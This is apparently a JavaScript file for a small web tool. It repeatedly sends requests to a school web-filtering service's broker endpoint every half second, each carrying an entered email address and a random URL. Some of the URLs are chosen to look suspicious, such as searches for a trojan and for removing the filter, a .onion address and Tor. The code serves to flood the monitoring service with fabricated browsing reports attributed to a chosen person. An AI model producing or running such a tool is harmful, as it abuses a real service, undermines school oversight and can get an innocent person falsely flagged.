var started=false;
var interval=0;
var email="@";
function getRandomURL() {
    var urls=[
        'https://www.google.com/','https://duckduckgo.com/?q=free%20bittorrent%20download','https://cia.gov','https://windows.net/','https://ubuntu.com','https://bing.com/','https://discord.com/channels/@me/5184691648778','https://torproject.org/','https://en.wikipedia.org/wiki/Dog','https://en.wikipedia.org/wiki/Life','https://en.wikipedia.org/wiki/The_Game_of_Life','http://neversll.com','https://www.youtube.com/watch?v=dQw4w9WgXcQ','https://ssl.google-analytics.com/','https://microsoft.com/','https://www.apple.com/shop/buy-iphone/iphone-13','https://www.google.com/search?q=MEMZ+trojan+4.0+clean+free+download+internet+archive','https://archive.org','https://web.archive.org','https://github.com/','https://replit.com/~','https://mail.google.com/mail/u/0/#inbox/bD9snX0jdbEqWW7xXe8QeD3e8bWo','https://www.youtube.com/','https://music.youtube.com/','https://www.securly.com/crextn/broker?','https://teacherdashboard.com/#/login','http://aaguyx6yhhbgba6tbdgv7yuadgvbagdyub77x8da9djx.onion/','https://1.1.1.1','https://drive.google.com/','https://ipv4.party','https://twitter.com/','https://mastodon.social/','https://windows93.net/','https://windows96.net/','https://lite.windows96.net/','https://hp.com/','https://docs.gle/ad8uioSFbue49A9dF','https://creativecommons.org/','https://gitlab.com/','https://tiktok.com','https://lastpass.com/','https://ublockorigin.com/','https://play.google.com/','https://editpad.org','https://nfl.com','https://netflix.com','https://spotify.com','https://www.disneyplus.com','https://open.spotify.com/','https://accounts.spotify.com/','https://wikimedia.org','https://adobe.com/','https://mozilla.org','https://espn.com','https://foundation.mozilla.org','https://brave.com','https://search.brave.com/','https://ecosia.org/','https://chrome.google.com/webstore/detail/application-launcher-for/lmjegmlicamnimmfhcmpkclmigmmcbeh', 'https://www.grammarly.com/','https://app.grammarly.com/','https://vscode.dev','https://codemirror.net','https://frogfind.com/','https://lite.duckduckgo.com/','https://nba.com/','https://mlb.com/','https://peacock.tv/','https://peacocktv.com/','https://amazon.com/','https://www.primevideo.com/','https://goo.gl/8748b9ad4e','https://goo.gle','https://support.google.com/','https://www.google.com/search?q=how%20to%20remove%20securely%20extension','https://api.hapara.com/','https://fydeos.io','https://drop.fydeos.io/','https://instructure.com/'
    ];
    return urls[
        Math.floor(
            Math.random()*urls.length
        )
    ]
}
function StartStop() {
    started=!started;
    email=document.querySelector('input').value;
    if(started) {
        document.querySelector('.go-button').innerText="Stop"
        interval=setInterval(function () {
            fetch(
                `https://www.securly.com/crextn/broker?useremail=${encodeURIComponent(email)}&reason=crextn&url=${encodeURIComponent(getRandomURL())}&ytoptions=true`,
                {
                    mode: "no-cors"
                }
            );
            if(navigator.onLine) {
                document.querySelector('.status').style.color="#48ad26";
                document.querySelector('.status').innerText="Online"
            } else {
                document.querySelector('.status').style.color="#bf9c1d";
                document.querySelector('.status').innerText="No Internet Connection!"
            }
        },500)
    } else {
        document.querySelector('.go-button').innerText="Let's Go!"
        clearInterval(interval)
        document.querySelector('.status').style.color="red";
        document.querySelector('.status').innerText="Not Connected"
    }
}